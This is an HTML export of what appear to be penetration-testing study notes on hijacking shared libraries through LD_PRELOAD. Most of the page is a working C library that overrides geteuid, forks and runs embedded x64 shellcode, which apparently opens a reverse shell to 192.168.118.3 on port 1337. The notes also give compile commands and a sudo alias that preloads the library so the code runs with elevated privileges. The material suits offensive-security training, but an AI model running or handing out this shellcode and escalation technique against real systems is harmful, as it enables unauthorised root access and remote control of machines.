<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>shared library hikjacking via LD_PRELOAD</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>shared library hikjacking via LD_PRELOAD</h1><br/><p></p><p><h2>Exploitation via LD_PRELOAD</h2><ul><li>• <small>• env variable which, when defined on the system, forces the dynamic linking loader to preload a particular shared library before any others.</small></li><li><small>As a result,functions that are defined in this library are used before any with the same method signature that are defined in other libraries.</small></li></ul><small></small></p><p><small></small><small></small></p><p><small></small><div class="codebox"><pre><span style="color:#7f0044;font-weight:700">#define _GNU_SOURCE</span><br /><span style="color:#7f0044;font-weight:700">#include &lt;sys/mman.h&gt;</span> <span style="color:#0088ff;font-weight:400">// for mprotect</span><br /><span style="color:#7f0044;font-weight:700">#include &lt;stdlib.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#include &lt;stdio.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#include &lt;dlfcn.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#include &lt;unistd.h&gt;</span><br /><br /><span style="color:#7f0044;font-weight:400">char</span> buf[] =<br /><span style="color:#3ad900;font-weight:400">&quot;\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x85\xc0\x78\x51\x6a\x0a&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00\x05\x39\xc0\xa8&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x76\x03\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x59&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x48\x85\xc0\x79\x25\x49\xff\xc9\x74\x18\x57\x6a\x23\x58\x6a&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x00\x6a\x05\x48\x89\xe7\x48\x31\xf6\x0f\x05\x59\x59\x5f\x48&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x85\xc0\x79\xc7\x6a\x3c\x58\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff\xe6&quot;</span>;<br /><br />uid_t geteuid(<span style="color:#7f0044;font-weight:400">void</span>)<br />{<br />    <span style="color:#ff9d00;font-weight:400">typeof</span>(geteuid) *old_geteuid;<br />    old_geteuid = dlsym(RTLD_NEXT, <span style="color:#3ad900;font-weight:400">&quot;geteuid&quot;</span>);<br />    <span style="color:#ff9d00;font-weight:700">if</span> (fork() == <span style="color:#ff0044;font-weight:400">0</span>)<br />        {<br />        <span style="color:#7f0044;font-weight:400">intptr_t</span> pagesize = sysconf(_SC_PAGESIZE);<br />        <span style="color:#ff9d00;font-weight:700">if</span> (mprotect((<span style="color:#7f0044;font-weight:400">void</span> *)(((<span style="color:#7f0044;font-weight:400">intptr_t</span>)buf) &amp; ~(pagesize - <span style="color:#ff0044;font-weight:400">1</span>)),pagesize, PROT_READ|PROT_EXEC)) {<br />            perror(<span style="color:#3ad900;font-weight:400">&quot;mprotect&quot;</span>);<br />            <span style="color:#ff9d00;font-weight:700">return</span> -<span style="color:#ff0044;font-weight:400">1</span>;<br />        }<br />        <span style="color:#7f0044;font-weight:400">int</span> (*ret)() = (<span style="color:#7f0044;font-weight:400">int</span>(*)())buf;<br />        ret();<br />        }<br />        <span style="color:#ff9d00;font-weight:700">else</span><br />        {<br />            printf(<span style="color:#3ad900;font-weight:400">&quot;HACK: returning from function...\n&quot;</span>);<br />            <span style="color:#ff9d00;font-weight:700">return</span> (*old_geteuid)();<br />        }<br />        printf(<span style="color:#3ad900;font-weight:400">&quot;HACK: Returning from main...\n&quot;</span>);<br />        <span style="color:#ff9d00;font-weight:700">return</span> -<span style="color:#ff0044;font-weight:400">2</span>;<br />        }</pre></div></p><p></p><p></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">## list library functions (search for functions lik,e geteuid that are called only once and do not hijack workflow</span><br />ltrace <span style="color:#7f0044;font-weight:400">$binary</span> <br /><span style="color:#0088ff;font-weight:400"># compile shared library function</span><br /><span style="color:#ff9d00;font-weight:700">gcc</span> -Wall -fPIC -z execstack -c -o evil_geteuid.o evileuid.c<br /><span style="color:#ff9d00;font-weight:700">gcc</span> -shared -o evil_geteuid.so evil_geteuid.o -ldl<br /><br /><span style="color:#0088ff;font-weight:400">## run via sudo </span><br /><span style="color:#ff9d00;font-weight:700">alias</span> sudo=<span style="color:#3ad900;font-weight:400">&quot;sudo LD_PRELOAD=/home/offsec/evil_geteuid.so&quot;</span></pre></div></p><p></p><p></p><p><h2>List services</h2></p><p></p><p>systemctl --type=service<ul><li>/usr/lib/systemd/system/rocketchat.service</li></ul></p></div>
</body>
</html>
